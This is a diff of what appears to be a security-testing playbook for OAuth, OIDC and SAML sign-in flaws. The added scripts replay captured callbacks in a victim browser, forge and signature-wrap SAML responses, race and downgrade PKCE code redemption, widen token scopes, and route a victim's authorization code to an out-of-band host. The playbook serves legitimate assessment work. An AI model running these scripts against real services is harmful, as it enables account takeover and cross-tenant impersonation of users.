@@ -84,7 +84,7 @@ chapter closes for the asset.
 
 ## Triage order
 
-OAU-008 (client secrets and identity-provider keys shipped to the browser: no account, a few greps) → OAU-004 (is
+OAU-008 (client secrets and identity-provider keys shipped in bundles or apps: no account, a few greps) → OAU-004 (is
 `state` bound to the browser: one capture, one replay) → OAU-001 (`redirect_uri` at the provider) → OAU-002
 (forwarders in the registered redirect space) → OAU-003 (token in the fragment or a message) → OAU-009 (what the
 sign-in endpoint accepts as the provider's token) → OAU-007 (sign-in matched by an e-mail the provider never
@@ -293,8 +293,8 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   kept in that browser's session or cookie, or a PKCE verifier or nonce kept the same way. Start the flow as A,
   finish the provider step, and stop before A's browser loads the callback, so the code stays unspent. Then make a
   fresh browser load that callback from another origin. If it ends up signed in as A, nothing binds the response to
-  the browser. A missing `state`, one that never changes, one checked only when present, and one compared with
-  nothing the victim's browser holds all fail the same way.
+  the browser. A missing `state`, one that never changes, one checked only when present, and one checked against
+  nothing tied to the browser all fail the same way.
 - **How:**
   ```bash
   LB="$T/auth/google"; CB='/auth/google/callback'     # the URL behind a "Sign in with" button, and the path of the callback it returns to
@@ -306,14 +306,15 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   awk -F'\t' 'NF >= 7 {print FILENAME ": " $6 " = " $7}' "$D"/start*.jar     # the pre-login cookies a binding could live in
   # 2. as A in the scriptable browser: start, sign in at the provider, and stop before the callback loads
   cat > "$D/capture.py" <<'PY'
-  # capture.py <start url> <callback path> <out file>: sign in as A in the window; the callback request is aborted and saved, unspent
+  # capture.py <start url> <callback path> <out file> [the HDR arguments]: sign in as A in the window; the callback is aborted and saved, unspent
   import sys
   from playwright.sync_api import sync_playwright
-  start, path, out = sys.argv[1:4]; got = []
+  start, path, out, *h = sys.argv[1:]; got = []
+  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H'); ua = h[h.index('-A') + 1] if '-A' in h else None
   def grab(route):
       r = route.request; got.append(f'{r.method} {r.url}\n{r.post_data or ""}'); route.abort()
   with sync_playwright() as p:
-      b = p.chromium.launch(headless=False); c = b.new_context()
+      b = p.chromium.launch(headless=False); c = b.new_context(user_agent=ua, extra_http_headers=hd)
       c.route(lambda url: path in url.split('?')[0], grab)
       pg = c.new_page(); pg.goto(start)
       for _ in range(300):
@@ -321,34 +322,35 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
           pg.wait_for_timeout(1000)
       open(out, 'w').write(got[0] if got else ''); b.close()
   PY
-  python3 "$D/capture.py" "$LB" "$CB" "$D/callback.txt"; sed -E 's/(code=)[^&]*/\1<redacted>/' "$D/callback.txt"
+  python3 "$D/capture.py" "$LB" "$CB" "$D/callback.txt" "${HDR[@]}"; sed -E 's/(code=)[^&]*/\1<redacted>/' "$D/callback.txt"
   # 3. the victim: a fresh profile is sent to the captured callback from another origin, then the target is asked who it is
   cat > "$D/victim.py" <<'PY'
-  # victim.py <capture file> <me url> <evidence dir>: replays the callback as a navigation (GET) or a self-posting form (form_post)
+  # victim.py <capture file> <me url> <evidence dir> [the HDR arguments]: replays the callback as a navigation (GET) or a self-posting form (form_post)
   import html, json, sys, urllib.parse as u
   from playwright.sync_api import sync_playwright
-  cap, me, d = sys.argv[1:4]; head, _, body = open(cap).read().partition('\n'); method, url = head.split(' ', 1)
+  cap, me, d, *h = sys.argv[1:]; head, _, body = open(cap).read().partition('\n'); method, url = head.split(' ', 1)
+  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H'); ua = h[h.index('-A') + 1] if '-A' in h else None
   fields = ''.join('<input type="hidden" name="%s" value="%s">' % (html.escape(k), html.escape(v)) for k, v in u.parse_qsl(body))
   page = ('<form method="POST" action="%s">%s</form><script>document.forms[0].submit()</script>' % (html.escape(url), fields)
           if method == 'POST' else '<script>location = %s</script>' % json.dumps(url))
   with sync_playwright() as p:
-      b = p.chromium.launch(); pg = b.new_context().new_page()
+      b = p.chromium.launch(); pg = b.new_context(user_agent=ua, extra_http_headers=hd).new_page()
       try: pg.set_content(page)
       except Exception as e: print('navigated away:', str(e)[:80])
       pg.wait_for_timeout(8000); print(pg.url)
       print(pg.evaluate('u => fetch(u, {credentials: "include"}).then(r => r.text()).catch(e => String(e))', me)[:300])
       pg.screenshot(path=d + '/victim.png'); b.close()
   PY
-  python3 "$D/victim.py" "$D/callback.txt" "$ME" "$D"
+  python3 "$D/victim.py" "$D/callback.txt" "$ME" "$D" "${HDR[@]}"
   # 4. refused in step 3: one more capture, delivered without state (some callbacks check it only when it is present)
-  python3 "$D/capture.py" "$LB" "$CB" "$D/callback2.txt"
+  python3 "$D/capture.py" "$LB" "$CB" "$D/callback2.txt" "${HDR[@]}"
   python3 - "$D/callback2.txt" <<'PY'
   import sys, urllib.parse as u
   f = sys.argv[1]; head, _, body = open(f).read().partition('\n'); m, url = head.split(' ', 1); s = u.urlsplit(url)
   drop = lambda qs: u.urlencode([(k, v) for k, v in u.parse_qsl(qs, keep_blank_values=True) if k != 'state'])
   open(f, 'w').write(f'{m} {u.urlunsplit(s._replace(query=drop(s.query)))}\n{drop(body)}')
   PY
-  python3 "$D/victim.py" "$D/callback2.txt" "$ME" "$D"
+  python3 "$D/victim.py" "$D/callback2.txt" "$ME" "$D" "${HDR[@]}"
   ```
 - **Proof:** `victim.png` and the identity call in the fresh browser naming A after it loaded only our page;
   `starts.txt` showing `state` absent, repeated or not tied to a pre-login cookie; the callback URL with the code
@@ -396,7 +398,7 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   ```bash
   D="$E/evidence/$H/OAU-005"; mkdir -p "$D" "$E/tools"; ME="$T/api/me"
   ACS='<tenant A ACS URL from its SSO settings>'; SPID='<the SP entityID (Audience) shown there>'; IDP="https://$OOB/oau005-idp"
-  START='<the SP-initiated sign-in for tenant A, e.g. $T/sso/<A slug>; empty if the SP accepts IdP-initiated responses>'
+  START="$T/<SP-initiated sign-in path for tenant A>"     # set START= (empty) when the SP accepts IdP-initiated responses
   # 0. our identity provider is a key pair: enter $IDP as its entityID, https://$OOB/oau005-sso as its sign-in URL and oau005.crt in tenant A
   openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj '/CN=oau005-idp' -keyout "$D/oau005.key" -out "$D/oau005.crt" 2>/dev/null
   [ -s "$E/tools/saml-forge.py" ] || cat > "$E/tools/saml-forge.py" <<'PY'
@@ -452,9 +454,9 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
     R=$(SAML_IRT="$IRT" python3 "$E/tools/saml-forge.py" "$ACS" "$SPID" "$IDP" "$1" "$D/oau005.key" "$D/oau005.crt")
     curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$J.body" -w "ACS %{http_code} %header{location}  <= $1\n" -X POST "$ACS" --data-urlencode "SAMLResponse=$R"
     curl -sS "${HDR[@]}" -b "$J" "$ME" | head -c 300; echo; sleep 1; }
-  sso '<an address of ours that is a member of tenant A>'                 # control: the connection works
-  sso '<B address: our account in tenant B, or a personal account>'       # the test
-  sso "oau005-new@<a domain of ours that no tenant has verified>"         # provisioning outside A's proved domains
+  sso '<an address of ours that is a member of tenant A>'                 # 1. control: the connection works
+  sso '<B address: our account in tenant B, or a personal account>'       # 2. the test
+  sso "oau005-new@<a domain of ours that no tenant has verified>"         # 3. provisioning outside A's proved domains
   curl -sS "${HDR[@]}" $B "$ME" | head -c 300; echo                         # B's own view, to compare ids and organisations
   # 4. domain routing: add a domain of ours to tenant A without finishing its proof, then ask the sign-in page where it routes
   curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}\n' -X POST '<the SSO discovery request of the sign-in page>' \
@@ -497,9 +499,10 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   `$A` carries A's session on the provider's host.
 - **Test:** a code is a one-time credential bound to one client, one `redirect_uri` and, with PKCE, one verifier
   (RFC 6749 §4.1.2 and §4.1.3, RFC 7636). Take a fresh code for A for each check and redeem it once in the wrong
-  way: a second time, in parallel, without the verifier its request carried or with a wrong one, with
-  `code_challenge_method=plain` where S256 is offered, with another `redirect_uri` or none, and with the second
-  client's credentials. Only the correct redemption may return a token.
+  way: a second time, in parallel, without the verifier its request carried or with a wrong one, with a verifier
+  for a code whose request carried no challenge (the PKCE downgrade that RFC 9700 §4.8 tells servers to refuse),
+  with `code_challenge_method=plain` where S256 is offered, with another `redirect_uri` or none, and with the
+  second client's credentials. Only the correct redemption may return a token.
 - **How:**
   ```bash
   AZ='<authorization_endpoint>'; TK='<token_endpoint>'; UI='<userinfo_endpoint>'; RU='<redirect_uri registered for our client>'
@@ -520,9 +523,11 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   C=$(code); for i in 1 2 3 4 5; do curl -sS "${HDR[@]}" "${CA[@]}" -o "$D/race$i.json" -X POST "$TK" -d grant_type=authorization_code \
     --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" & done; wait; echo "race: $(grep -l '"access_token"' "$D"/race*.json | wc -l) of 5 got a token"
   curl -sS "${HDR[@]}" -H "Authorization: Bearer $(jq -r .access_token "$D/first.json")" -o /dev/null -w 'first token after the reuse: %{http_code}\n' "$UI"
-  # 2. PKCE: the challenge was sent; the verifier is then missing, wrong, right (control), and plain is tried where S256 is offered
+  # 2. PKCE: the challenge was sent and the verifier is then missing, wrong or right (control); a verifier for a code issued
+  #    without a challenge (downgrade); plain where S256 is offered
   read -r V CH <<<"$(pk)"; S=(--data-urlencode "code_challenge=$CH" --data-urlencode code_challenge_method=S256)
   C=$(code "${S[@]}"); red pkce-none --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU"
+  C=$(code); red pkce-downgrade --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" --data-urlencode "code_verifier=$V"
   C=$(code "${S[@]}"); red pkce-wrong --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" --data-urlencode "code_verifier=$(pk | cut -d' ' -f1)"
   C=$(code "${S[@]}"); red pkce-right --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" --data-urlencode "code_verifier=$V"
   C=$(code --data-urlencode "code_challenge=$V" --data-urlencode code_challenge_method=plain)
@@ -584,19 +589,20 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   #    (decode the id_token our own test client receives for that identity, or read the provider's userinfo for it)
   # 3. a clean browser signs in through the target's button as the attacker identity; whom does the target say we are?
   [ -s "$E/tools/sso-login.py" ] || cat > "$E/tools/sso-login.py" <<'PY'
-  # sso-login.py <start url> <me url> <png>: fresh profile; do the provider step in the window; prints the landing URL and the me response
+  # sso-login.py <start url> <me url> <png> [the HDR arguments]: fresh profile; do the provider step in the window; prints the landing URL and the me response
   import sys
   from playwright.sync_api import sync_playwright
-  start, me, png = sys.argv[1:4]; host = start.split('/')[2]
+  start, me, png, *h = sys.argv[1:]; host = start.split('/')[2]
+  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H'); ua = h[h.index('-A') + 1] if '-A' in h else None
   with sync_playwright() as p:
-      b = p.chromium.launch(headless=False); pg = b.new_context().new_page(); pg.goto(start)
+      b = p.chromium.launch(headless=False); pg = b.new_context(user_agent=ua, extra_http_headers=hd).new_page(); pg.goto(start)
       pg.wait_for_url(lambda u: u.startswith('http') and u.split('/')[2] != host, timeout=60000)     # at the provider
       pg.wait_for_url(lambda u: u.startswith('http') and u.split('/')[2] == host, timeout=300000)    # back after its step
       pg.wait_for_timeout(4000); print(pg.url)
       print(pg.evaluate('u => fetch(u, {credentials: "include"}).then(r => r.text()).catch(e => String(e))', me)[:400])
       pg.screenshot(path=png); b.close()
   PY
-  python3 "$E/tools/sso-login.py" "$LB" "$ME" "$D/attacker.png" | tee "$D/attacker-me.txt"
+  python3 "$E/tools/sso-login.py" "$LB" "$ME" "$D/attacker.png" "${HDR[@]}" | tee "$D/attacker-me.txt"
   grep -oE '"(id|user_id|uuid)":"?[A-Za-z0-9-]+' "$D/B-before.json" "$D/attacker-me.txt"
   ```
 - **Proof:** B's id in `B-before.json` and the same id in `attacker-me.txt`, from a browser that only signed in
@@ -727,17 +733,18 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   try alg-none "{\"$F\":\"$(jwtx none)\"}"
   # 3. B's token from OUR client at the same provider: B signs in once to our own registered client in the browser
   cat > "$D/own-client.py" <<'PY'
-  # own-client.py <authorize URL of our client> <its redirect_uri>: sign in as B in the window; prints the id_token or access_token
+  # own-client.py <authorize URL of our client> <its redirect_uri> [the HDR arguments]: sign in as B in the window; prints the id_token or access_token
   import sys, urllib.parse as u
   from playwright.sync_api import sync_playwright
-  url, ru = sys.argv[1:3]
+  url, ru, *h = sys.argv[1:]
+  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H'); ua = h[h.index('-A') + 1] if '-A' in h else None
   with sync_playwright() as p:
-      b = p.chromium.launch(headless=False); c = b.new_context(); c.route(ru + '**', lambda r: r.fulfill(body='oau009'))
+      b = p.chromium.launch(headless=False); c = b.new_context(user_agent=ua, extra_http_headers=hd); c.route(ru + '**', lambda r: r.fulfill(body='oau009'))
       pg = c.new_page(); pg.goto(url); pg.wait_for_url(ru + '**', timeout=300000)
       f = dict(u.parse_qsl(u.urlsplit(pg.url).fragment)); print(f.get('id_token') or f.get('access_token', '')); b.close()
   PY
   OC='<our client id at the provider>'; OR="https://$OOB/oau009-cb"      # registered for our client; the browser route answers it
-  TB=$(python3 "$D/own-client.py" "<provider authorize URL>?client_id=$OC&response_type=id_token&scope=openid%20email&nonce=oau009&redirect_uri=$(jq -rn --arg v "$OR" '$v|@uri')" "$OR")
+  TB=$(python3 "$D/own-client.py" "<provider authorize URL>?client_id=$OC&response_type=id_token&scope=openid%20email&nonce=oau009&redirect_uri=$(jq -rn --arg v "$OR" '$v|@uri')" "$OR" "${HDR[@]}")
   try other-client "{\"$F\":\"$TB\"}"
   # 4. a token of A from an earlier sign-in, or one past its exp
   try old-token "{\"$F\":\"<an earlier token of A>\"}"
@@ -789,21 +796,21 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   code(){ curl -sS "${HDR[@]}" $A -o /dev/null -w '%header{location}' --get "$AZ" --data-urlencode "client_id=$CID" --data-urlencode response_type=code \
     --data-urlencode "redirect_uri=$RU" --data-urlencode "scope=$NARROW" --data-urlencode state=oau010 \
     | python3 -c 'import sys, urllib.parse as u; print(dict(u.parse_qsl(u.urlsplit(sys.stdin.read()).query)).get("code", ""))'; }
-  tok(){ n=$1; shift; curl -sS "${HDR[@]}" -u "$CID:$CS" -o "$D/$n.json" -X POST "$TK" "$@"; printf '%-10s ' "$n"
+  tok(){ n=$1; shift; curl -sS "${HDR[@]}" -u "$CID:$CS" -o "$D/$n.json" -X POST "$TK" "$@"; printf '%-15s ' "$n"
     jq -c '{scope, error, refresh: (.refresh_token != null)}' "$D/$n.json"; sleep 1; }
   # 1. a wider scope asked at the code exchange, then at refresh
-  tok exchange -d grant_type=authorization_code --data-urlencode "code=$(code)" --data-urlencode "redirect_uri=$RU" --data-urlencode "scope=$NARROW $WIDE"
-  tok refresh -d grant_type=refresh_token --data-urlencode "refresh_token=$(jq -r .refresh_token "$D/exchange.json")" --data-urlencode "scope=$NARROW $WIDE"
-  AT=$(jq -r '.access_token // empty' "$D/refresh.json"); AT=${AT:-$(jq -r .access_token "$D/exchange.json")}
-  # 2. a token exchange for the wider scope
-  tok exchange2 -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange --data-urlencode "subject_token=$AT" \
+  tok code-exchange -d grant_type=authorization_code --data-urlencode "code=$(code)" --data-urlencode "redirect_uri=$RU" --data-urlencode "scope=$NARROW $WIDE"
+  tok refresh -d grant_type=refresh_token --data-urlencode "refresh_token=$(jq -r .refresh_token "$D/code-exchange.json")" --data-urlencode "scope=$NARROW $WIDE"
+  AT=$(jq -r '.access_token // empty' "$D/refresh.json"); AT=${AT:-$(jq -r .access_token "$D/code-exchange.json")}
+  # 2. a token exchange (RFC 8693) for the wider scope
+  tok token-exchange -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange --data-urlencode "subject_token=$AT" \
     -d subject_token_type=urn:ietf:params:oauth:token-type:access_token --data-urlencode "scope=$WIDE"
   # 3. what the token really holds: the provider's view, then one route on A's own data that only $WIDE allows
   curl -sS "${HDR[@]}" -u "$CID:$CS" -X POST "$IN" --data-urlencode "token=$AT" | jq -c '{active, scope, client_id}'
   curl -sS "${HDR[@]}" -H "Authorization: Bearer $AT" -o "$D/outside.json" -w 'route that needs the wider scope: %{http_code}\n' "$T/<route on A's own data>"
   # 4. hand-offs that answer a bearer token with a first-party session
-  grep -rhoE "[\"'](/[A-Za-z0-9_/.-]*(login_option|token_login|login_with_token|from_token|handoff|session/token|sso/token|exchange)[A-Za-z0-9_/.-]*)[\"']" \
-    "$E/recon/$H/js/" | tr -d "\"'" | sort -u | tee "$D/handoffs.txt"
+  grep -rhoE "[\"'](/[A-Za-z0-9_/.-]*(login_option|token_login|login_with_token|from_token|handoff|session/token|sso/token|exchange)[A-Za-z0-9_/.-]*)[\"'?]" \
+    "$E/recon/$H/js/" | tr -d "\"'?" | sort -u | tee "$D/handoffs.txt"
   while read -r u; do curl -sS "${HDR[@]}" -H "Authorization: Bearer $AT" -o /dev/null -w "%{http_code} %header{set-cookie} <= $u\n" "$T$u" \
     | cut -c1-160; sleep 1; done < "$D/handoffs.txt"
   ```
@@ -941,14 +948,16 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   EOF
   # B's provider session with its real cookie attributes: B signs in once, e.g. python3 -m playwright codegen --save-storage="$D/B-provider.json" "$AZ"
   cat > "$D/victim.py" <<'PY'
-  # victim.py <storage state of B> <page>: open our page in B's browser and print where it ends (our redirect_uri with code= is the hit)
+  # victim.py <storage state of B> <page> [the HDR arguments]: open our page in B's browser and print where it ends (our redirect_uri with code= is the hit)
   import os, sys
   from playwright.sync_api import sync_playwright
+  state, page, *h = sys.argv[1:]
+  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H'); ua = h[h.index('-A') + 1] if '-A' in h else None
   with sync_playwright() as p:
-      b = p.chromium.launch(); pg = b.new_context(storage_state=sys.argv[1]).new_page()
-      pg.goto('file://' + os.path.abspath(sys.argv[2])); pg.wait_for_timeout(8000); print(pg.url); b.close()
+      b = p.chromium.launch(); pg = b.new_context(storage_state=state, user_agent=ua, extra_http_headers=hd).new_page()
+      pg.goto('file://' + os.path.abspath(page)); pg.wait_for_timeout(8000); print(pg.url); b.close()
   PY
-  python3 "$D/victim.py" "$D/B-provider.json" "$D/poc.html" | tee "$D/landing.txt"
+  python3 "$D/victim.py" "$D/B-provider.json" "$D/poc.html" "${HDR[@]}" | tee "$D/landing.txt"
   # 4. a code for B from step 1 or 3 (the $OOB log line for /oau012-cb, or landing.txt): redeem it with our client, ask whose it is
   C='<code>'; curl -sS "${HDR[@]}" -u "$CID:$CS" -X POST "$TK" -d grant_type=authorization_code --data-urlencode "code=$C" \
     --data-urlencode "redirect_uri=$RU" -o "$D/token.json"
@@ -1108,14 +1117,17 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
   D="$E/evidence/$H/OAU-014"; mkdir -p "$D" "$E/tools"; ME="$T/api/me"
   ACS='<ACS URL, exactly as the browser posts to it>'; START='<SP-initiated sign-in URL>'; EB='<B identifier exactly as the IdP writes NameIDs>'
   cat > "$D/saml-capture.py" <<'PY'
-  # saml-capture.py <start url> <acs url> <out file> <profile dir>: the POST to the ACS is aborted and saved unspent, with the SP cookies as a curl jar
+  # saml-capture.py <start url> <acs url> <out file> <profile dir> [the HDR arguments]: the POST to the ACS is aborted and saved
+  # unspent, with the SP cookies as a curl jar next to it
   import sys, urllib.parse as u
   from playwright.sync_api import sync_playwright
-  start, acs, out, prof = sys.argv[1:5]; got = []
+  start, acs, out, prof, *h = sys.argv[1:]; got = []
+  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H'); ua = h[h.index('-A') + 1] if '-A' in h else None
   def grab(route):
       got.append(dict(u.parse_qsl(route.request.post_data or '')).get('SAMLResponse', '')); route.abort()
   with sync_playwright() as p:
-      c = p.chromium.launch_persistent_context(prof, headless=False); c.route(lambda x: x.split('?')[0] == acs, grab)
+      c = p.chromium.launch_persistent_context(prof, headless=False, user_agent=ua, extra_http_headers=hd)
+      c.route(lambda x: x.split('?')[0] == acs, grab)
       pg = c.new_page(); pg.goto(start)
       for _ in range(300):              # first run: sign in at the identity provider as A; later runs reuse its session in the profile
           if got: break
@@ -1184,19 +1196,19 @@ provider never signed: no account needed) → OAU-014 (a signed SAML response wr
     J="$D/$1.out.jar"; if [ -n "$3" ]; then cp "$3" "$J"; else : > "$J"; fi
     curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$D/$1.body" -w "$1 %{http_code} %header{location}\n" -X POST "$ACS" --data-urlencode "SAMLResponse=$(tr -d '\n' < "$2")"
     curl -sS "${HDR[@]}" -b "$J" "$ME" | head -c 200; echo; sleep 1; }
-  CAP=(python3 "$D/saml-capture.py" "$START" "$ACS")
+  cap(){ python3 "$D/saml-capture.py" "${2:-$START}" "${3:-$ACS}" "$1" "$D/profile" "${HDR[@]}"; }   # cap <out> [start acs]
   # 1. control in its own session, the same response again (replay), then a fresh one from a jar that never started a sign-in
-  "${CAP[@]}" "$D/a1" "$D/profile"; post control "$D/a1" "$D/a1.jar"; post replay "$D/a1" "$D/a1.jar"
-  "${CAP[@]}" "$D/a2" "$D/profile"; post unsolicited "$D/a2"
+  cap "$D/a1"; post control "$D/a1" "$D/a1.jar"; post replay "$D/a1" "$D/a1.jar"
+  cap "$D/a2"; post unsolicited "$D/a2"
   # 2. wrapping and comment variants naming B: list the shapes this response allows, then one fresh response of A per shape
-  "${CAP[@]}" "$D/a3" "$D/profile"; python3 "$E/tools/saml-xsw.py" "$D/a3" "$EB" "$D/shapes" | tee "$D/shapes.txt"
+  cap "$D/a3"; python3 "$E/tools/saml-xsw.py" "$D/a3" "$EB" "$D/shapes" | tee "$D/shapes.txt"
   for v in $(sed -n 's/^wrote //p' "$D/shapes.txt"); do
-    "${CAP[@]}" "$D/f-$v" "$D/profile"; python3 "$E/tools/saml-xsw.py" "$D/f-$v" "$EB" "$D/v-$v" > /dev/null
+    cap "$D/f-$v"; python3 "$E/tools/saml-xsw.py" "$D/f-$v" "$EB" "$D/v-$v" > /dev/null
     post "$v" "$D/v-$v/$v.b64" "$D/f-$v.jar"; done
   # 3. late: a fresh response held past its NotOnOrAfter, then posted in its own session
-  "${CAP[@]}" "$D/a4" "$D/profile"; base64 -d "$D/a4" | grep -oE 'NotOnOrAfter="[^"]+"' | sort -u; sleep 420; post late "$D/a4" "$D/a4.jar"
+  cap "$D/a4"; base64 -d "$D/a4" | grep -oE 'NotOnOrAfter="[^"]+"' | sort -u; sleep 420; post late "$D/a4" "$D/a4.jar"
   # 4. audience: a response the same IdP issued to another SP, captured with that SP's start and ACS, posted here
-  python3 "$D/saml-capture.py" '<other SP start URL>' '<other SP ACS URL>' "$D/o1" "$D/profile"; post other-audience "$D/o1"
+  cap "$D/o1" '<other SP start URL>' '<other SP ACS URL>'; post other-audience "$D/o1"
   ```
   Signed but encrypted assertions (`EncryptedAssertion`) cannot be rewritten without the SP's key: wrap around the
   encrypted element only when the response itself is signed (XSW1 and XSW2).
